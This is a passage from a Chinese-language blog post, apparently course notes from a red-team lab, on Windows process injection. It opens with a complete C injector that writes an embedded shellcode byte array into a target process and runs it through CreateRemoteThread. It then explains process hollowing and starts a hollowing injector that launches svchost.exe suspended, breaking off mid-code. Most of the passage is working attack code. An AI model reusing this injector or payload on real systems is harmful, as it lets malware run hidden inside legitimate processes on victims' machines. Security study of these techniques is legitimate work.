class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> shellcode</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">db</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d9</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">74</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">24</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ab</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c9</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">30</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">31</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">18</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">83</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">04</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">03</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">af</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">8d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">57</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">03</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ad</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">6e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">06</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e3</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">58</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ba</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">eb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">fc</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">8f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">be</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">fa</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e9</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dc</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">34</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">fc</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">19</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">26</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">85</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">77</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">72</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">79</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">92</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f9</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d2</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">95</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">90</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ea</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">67</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">75</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">41</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">68</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">be</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ae</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">58</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">53</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b6</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">8f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ee</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">48</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ad</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">65</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">68</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">02</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">44</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">41</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">14</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">eb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f4</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">82</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ee</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">bd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">82</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">92</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a9</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">42</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">1b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">39</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">87</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ec</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c3</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ee</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">44</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">23</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">48</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">19</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2b</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">59</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">90</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">53</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">94</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">89</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">31</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a9</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d6</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ca</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">39</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">19</span></span><span class="line"><span style="color: #ABB2BF">};</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    HANDLE h_process </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, (</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span><span class="line"><span style="color: #ABB2BF">    PVOID b_shellcode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(h_process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, (MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(h_process, b_shellcode, shellcode, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    HANDLE h_thread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(h_process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)b_shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="Process-Hollowing-进程挖空"><a href="#Process-Hollowing-进程挖空" class="headerlink" title="Process Hollowing 进程挖空"></a>Process Hollowing 进程挖空</h2><p><strong>进程挖空（Process Hollowing）</strong>，或称为“空心化”，是一种常见的恶意软件技术。它的核心思想就是：</p><ol><li><strong>创建外壳</strong>：创建一个合法的、看似无害的进程（比如 <code>notepad.exe</code>）。但关键在于，这个进程被创建时是<strong>暂停</strong>的。</li><li><strong>清空外壳</strong>：利用暂停状态，攻击者可以清空这个合法进程的内存空间。</li><li><strong>注入恶意代码</strong>：将恶意代码（payload）注入到这个被清空的内存空间中。</li><li><strong>恢复执行</strong>：恢复进程的执行，此时，这个合法进程实际上执行的是注入的恶意代码。</li></ol><p>这些步骤也可以用图表形式分解，以描绘 Windows API 调用如何与进程内存交互。</p><img src="/thm_rthe/3c36b4470fb04e3bfdbbef0674b79ec2.png" class="" title="img"><p>接下来会讲解一个基本的进程镂空注入器：</p><h4 id="第一步：创建挂起进程"><a href="#第一步：创建挂起进程" class="headerlink" title="第一步：创建挂起进程"></a>第一步：创建挂起进程</h4><p>我们必须使用 <code>CreateProcessA</code> 创建一个处于挂起状态的目标进程。并传入 <code>STARTUPINFOA</code> 和 <code>PROCESS_INFORMATION</code> 结构体，来创建并获取目标进程的启动信息和句柄。</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA function (processthreadsapi.h) - Win32 apps</a></li></ul><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// STARTUPINFOA 是一个结构体，它包含新进程的启动信息，比如窗口大小、位置、标准输入/输出句柄等</span></span><span class="line"><span style="color: #ABB2BF">LPSTARTUA target_si </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">STARTUPINFOA</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 包含进程和主线程的信息</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// PROCESS_INFORMATION 是一个结构体，这里会接收 CreateProcessA 函数返回的新创建的进程和其主线程的句柄和 ID</span></span><span class="line"><span style="color: #ABB2BF">LPPROCESS_INFORMATION target_pi </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">PROCESS_INFORMATION</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 上下文结构体指针</span></span><span class="line"><span style="color: #ABB2BF">CONTEXT c;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">CreateProcessA</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">(LPSTR)</span><span style="color: #98C379">&quot;C:</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">Windows</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">System32</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">svchost.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 要执行的程序名称</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 命令行参数</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 进程安全属性</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 线程安全属性</span></span><span class="line"><span style="color: #ABB2BF">TRUE,</span><span style="color: #7F848E; font-style: italic"> // 句柄从调用进程继承</span></span><span class="line"><span style="color: #ABB2BF">CREATE_SUSPENDED,</span><span style="color: #7F848E; font-style: italic"> // 新进程处于暂停状态</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 环境变量 